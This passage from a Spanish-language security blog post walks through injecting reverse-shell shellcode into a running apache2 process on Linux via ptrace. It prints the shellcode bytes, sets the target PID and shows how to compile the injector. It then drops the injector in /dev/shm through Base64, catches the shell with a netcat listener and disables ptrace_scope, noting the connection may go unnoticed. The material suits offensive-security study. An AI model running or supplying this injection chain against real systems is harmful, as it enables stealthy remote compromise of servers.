</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xa8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x12</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x52</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span>
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x62</span>
</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x69</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x54</span>
</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span>
</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x3c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span>
</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a><span class="no">sc_len</span><span class="w"> </span><span class="kd">equ</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">shellcode</span>
</span></code></pre></div>
<p>Ya solo queda obtener el PID del proceso objetivo para completar la configuración de los scripts. En este caso, usaremos como objetivo el proceso <code>apache2</code> del usuario <code>www-data</code> (aunque también podría elegirse uno ejecutándose como <em>root</em> si se desea conservar los privilegios tras la conexión), ya que es un proceso de larga duración que suele permanecer activo en un servidor web y cuyas conexiones salientes pueden pasar más desapercibidas.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Máquina víctima</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>ps<span class="w"> </span>-u<span class="w"> </span>www-data<span class="w"> </span>-o<span class="w"> </span>pid,etime,cmd
</span></code></pre></div>
<p><img alt="image.png" src="../RAZOR/image_2.png" /></p>
<p>Se elige uno de los worker processes (PID <strong>5204</strong>) y se actualiza el valor en <code>proc_inj.asm</code>.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">; proc_inj.asm</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1">; PID    </span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">r15</span><span class="p">,</span><span class="w"> </span><span class="mi">5204</span>
</span></code></pre></div>
<p>Una vez configurado el script inyector, lo compilamos.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># Compilar el inyector</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj.asm<span class="w"> </span>-o<span class="w"> </span>proc_inj.o
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>ld<span class="w"> </span>proc_inj.o<span class="w"> </span>-o<span class="w"> </span>proc_inj
</span></code></pre></div>
<p>Una vez que disponemos del ejecutable, es necesario alojarlo en la máquina víctima. Existen numerosos métodos para hacerlo, pero si no contamos con una shell completamente interactiva, mi opción preferida es transferirlo en Base64, reconstruirlo en <code>/dev/shm</code> y ejecutarlo desde ahí. </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Convertir el binario a Base64 y mostrarlo por pantalla</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>./proc_inj<span class="w"> </span>&gt;<span class="w"> </span>proc_inj.b64<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>proc_inj.b64
</span></code></pre></div>
<p>Antes de realizar la ejecución en la máquina objetivo recuerda mantenerte a la escucha en el puerto establecido.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Máquina atacante</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">443</span>
</span></code></pre></div>
<p>Una vez todo preparado, alojamos y ejecutamos el inyector en la máquina objetivo.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Máquina víctima</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="c1"># Decodifica Base64 a binario en memoria (tmpfs), asigna permisos de ejecución y ejecuta inmediatamente</span>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;Base64&gt;&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>/dev/shm/proc_inj<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/dev/shm/proc_inj<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>/dev/shm/proc_inj
</span></code></pre></div>
<p>Inmediatamente después, recibimos la conexión entrante desde la víctima.</p>
<p><img alt="image.png" src="../RAZOR/image_3.png" /></p>
<h2 id="consideraciones-de-seguridad">Consideraciones de seguridad<a class="headerlink" href="#consideraciones-de-seguridad" title="Permanent link">&para;</a></h2>
<p>Para que <code>ptrace</code> funcione sobre el proceso objetivo, se debe cumplir <strong>al menos una de las siguientes condiciones</strong> de privilegio:</p>
<ul>
<li>El tracer debe tener el <strong>mismo UID</strong> <strong>que el <em>tracee</em></strong>.</li>
<li>El tracer debe tener la <strong>capability <code>CAP_SYS_PTRACE</code></strong>.</li>
<li>El tracer debe <strong>ejecutarse como <code>root</code></strong>.</li>
</ul>
<p>Además, el fichero <code>/proc/sys/kernel/yama/ptrace_scope</code> indica restricciones adicionales:</p>
<table>
<thead>
<tr>
<th>Valor</th>
<th>Restricción</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Sin restricciones</td>
</tr>
<tr>
<td>1</td>
<td>Solo hacia procesos hijos</td>
</tr>
<tr>
<td>2</td>
<td>Solo con <code>CAP_SYS_PTRACE</code></td>
</tr>
<tr>
<td>3</td>
<td>Ptrace completamente deshabilitado</td>
</tr>
</tbody>
</table>
<p>Se puede desactivar temporalmente realizando la siguiente operación:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/yama/ptrace_scope
</span></code></pre></div>
<h2 id="agradecimientos">Agradecimientos<a class="headerlink" href="#agradecimientos" title="Permanent link">&para;</a></h2>
<p>Gracias por llegar hasta aquí.</p>
<p>Si encuentras errores o quieres mejorar/ampliar el artículo, el contenido del blog está abierto a Pull Requests. Toda contribución es bienvenida.</p>
<p>¡Nos vemos en el próximo artículo! ;)</p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Volver al principio
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      © 2026 0x574R
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  </body>
</html>